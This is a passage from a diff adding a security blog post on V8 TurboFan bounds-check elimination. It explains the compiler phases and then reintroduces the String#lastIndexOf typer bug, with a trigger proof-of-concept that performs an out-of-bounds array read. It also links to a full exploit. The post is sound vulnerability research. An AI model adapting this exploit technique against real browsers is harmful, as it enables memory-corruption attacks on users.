+&lt;span class="p"&gt;};&lt;/span&gt;
+&lt;span class="nx"&gt;opt_me&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;OptimizeFunctionOnNextCall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;opt_me&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nx"&gt;opt_me&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With this example, we're going to observe a few things: &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;simplified lowering does not remove the CheckBounds node as it would have before,&lt;/li&gt;
+&lt;li&gt;the lowering of this node and how it leads to the creation of an Unreachable node,&lt;/li&gt;
+&lt;li&gt;eventually, bound checking will get completely removed (which is correct and expected).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="typing-of-a-checkbounds"&gt;Typing of a CheckBounds&lt;/h3&gt;
+&lt;p&gt;Without surprise, a CheckBounds node is generated and gets a type of Range(0,0) during the typer phase.&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img alt="typer" src="/images/turbofan_bce/typer.png"&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;h3 id="checkbounds-lowering-to-checkeduint32bounds"&gt;CheckBounds lowering to CheckedUint32Bounds&lt;/h3&gt;
+&lt;p&gt;The CheckBounds node is not removed during simplified lowering the way it would have been before. It is lowered to a CheckedUint32Bounds instead.&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img alt="simplified_lowering" src="/images/turbofan_bce/simplified_lowering.png"&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;h3 id="effect-linearization-checkeduint32bounds-to-uint32lessthan-with-unreachable"&gt;Effect Linearization :  CheckedUint32Bounds to Uint32LessThan with Unreachable&lt;/h3&gt;
+&lt;p&gt;Let's have a look at the effect linearization.&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img alt="effect_linearization_schedule" src="/images/turbofan_bce/effect_linearization_schedule.png"&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img alt="effect_linearization" src="/images/turbofan_bce/effect_linearization.png"&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;p&gt;The CheckedUint32Bounds is replaced by several nodes. Instead of this bound checking node, there is a Uint32LessThan node that either leads to a LoadElement node or an Unreachable node.&lt;/p&gt;
+&lt;h3 id="late-optimization-machineoperatorreducer-and-deadcodeelimination"&gt;Late optimization : MachineOperatorReducer and DeadCodeElimination&lt;/h3&gt;
+&lt;p&gt;It seems pretty obvious that the Uint32LessThan can be lowered to a constant true (Int32Constant).  In the case of Uint32LessThan being replaced by a constant node the rest of the code, including the Unreachable node, will be removed by the dead code elimination. Therefore, no bounds check remains and no breakpoint will ever be reached, regardless of any OOB accesses that are attempted.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// Perform constant folding and strength reduction on machine operators.&lt;/span&gt;
+&lt;span class="n"&gt;Reduction&lt;/span&gt; &lt;span class="n"&gt;MachineOperatorReducer&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Node&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="c1"&gt;// [...]&lt;/span&gt;
+      &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="n"&gt;IrOpcode&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="nl"&gt;kUint32LessThan&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="n"&gt;Uint32BinopMatcher&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;kMaxUInt32&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ReplaceBool&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// M &amp;lt; x =&amp;gt; false&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;Is&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ReplaceBool&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;          &lt;span class="c1"&gt;// x &amp;lt; 0 =&amp;gt; false&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsFoldable&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;                                    &lt;span class="c1"&gt;// K &amp;lt; K =&amp;gt; K&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ReplaceBool&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;LeftEqualsRight&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ReplaceBool&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// x &amp;lt; x =&amp;gt; false&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;IsWord32Sar&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;HasValue&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;Int32BinopMatcher&lt;/span&gt; &lt;span class="n"&gt;mleft&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mleft&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;HasValue&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="c1"&gt;// (x &amp;gt;&amp;gt; K) &amp;lt; C =&amp;gt; x &amp;lt; (C &amp;lt;&amp;lt; K)&lt;/span&gt;
+          &lt;span class="c1"&gt;// when C &amp;lt; (M &amp;gt;&amp;gt; K)&lt;/span&gt;
+          &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+          &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mleft&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x1F&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="k"&gt;static_cast&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;uint32_t&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;kMaxInt&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ReplaceInput&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mleft&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+            &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ReplaceInput&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Uint32Constant&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;Changed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+          &lt;span class="p"&gt;}&lt;/span&gt;
+          &lt;span class="c1"&gt;// TODO(turbofan): else the comparison is always true.&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt;
+      &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="c1"&gt;// [...]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;center&gt;&lt;img alt="final_replacement_of_bound_check" src="/images/turbofan_bce/final_replacement_of_bound_check.png"&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;h3 id="final-scheduling-no-more-bound-checking"&gt;Final scheduling : no more bound checking&lt;/h3&gt;
+&lt;p&gt;To observe the generated code, let's first look at the final scheduling phase and confirm that eventually, only a Load at index 0 remains.&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img alt="scheduling" src="/images/turbofan_bce/scheduling.png"&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;h3 id="generated-assembly-code"&gt;Generated assembly code&lt;/h3&gt;
+&lt;p&gt;In this case, TurboFan correctly understood that no bound checking was necessary and simply generated a mov instruction &lt;code&gt;movq rax, [fixed_array_base + offset_to_element_0]&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="final_asm" src="/images/turbofan_bce/final_asm.png"&gt;&lt;/p&gt;
+&lt;p&gt;To sum up : &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;arr[good_idx] leads to the creation of a CheckBounds node in the early phases&lt;/li&gt;
+&lt;li&gt;during "simplified lowering", it gets replaced by an aborting CheckedUint32Bounds&lt;/li&gt;
+&lt;li&gt;The CheckedUint32Bounds gets replaced by several nodes during "effect linearization" : Uint32LessThan and Unreachable&lt;/li&gt;
+&lt;li&gt;Uint32LessThan is constant folded during the "Late Optimization" phase&lt;/li&gt;
+&lt;li&gt;The Unreachable node is removed during dead code elimination of the "Late Optimization" phase&lt;/li&gt;
+&lt;li&gt;Only a simple Load remains during the final scheduling&lt;/li&gt;
+&lt;li&gt;Generated assembly is a simple mov instruction without bound checking&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="typer-bug"&gt;Typer bug&lt;/h2&gt;
+&lt;p&gt;Let's consider &lt;a href="https://chromium-review.googlesource.com/c/v8/v8/+/660000/"&gt;the String#lastIndexOf bug&lt;/a&gt; where the typing of kStringIndexOf and kStringLastIndexOf is incorrect. The computed type is: 
+&lt;code&gt;Type::Range(-1.0, String::kMaxLength - 1.0, t-&amp;gt;zone())&lt;/code&gt; instead of &lt;code&gt;Type::Range(-1.0, String::kMaxLength, t-&amp;gt;zone())&lt;/code&gt;. This is incorrect because both String#indexOf and String#astIndexOf can return a value of kMaxLength. You can find &lt;a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874/tree/master/trigger"&gt;more details about this bug on my github&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;This bug is exploitable even with the introduction of aborting bound checks. So let's reintroduce it on v8 7.5 and &lt;a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874/blob/master/exploit.js"&gt;exploit it&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;In summary, if we use lastIndexOf on a string with a length of kMaxLength, the computed Range type will be kMaxLength - 1 while it is actually kMaxLength. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;____&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DOARE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;repeat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;214748359&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;lastIndexOf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// typed as kMaxLength-1 instead of kMaxLength&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can then amplify this typing error.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;lastIndexOf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Math&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Math&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;badly_typed&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// type is Range(0,0) instead of Range(1,1)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;If all of this seems unclear, check my previous &lt;a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/"&gt;introduction to TurboFan&lt;/a&gt; and &lt;a href="https://github.com/JeremyFetiveau/TurboFan-exploit-for-issue-762874/"&gt;my github&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Now, consider the following trigger poc : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="nx"&gt;FAILURE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x42&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;____&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DOARE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;repeat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;214748359&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;it&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;opt_me&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;OOB_OFFSET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;lastIndexOf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Math&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Math&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;badly_typed&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;bad&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;badly_typed&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;OOB_OFFSET&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;bad&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="nx"&gt;OOB_OFFSET&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="nx"&gt;it&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x10000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;arr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;arr2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;({},{});&lt;/span&gt;
+    &lt;span class="nx"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;arr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;bad&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;undefined&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;};&lt;/span&gt;
+
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;opt_me&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x10000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;opt_me&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
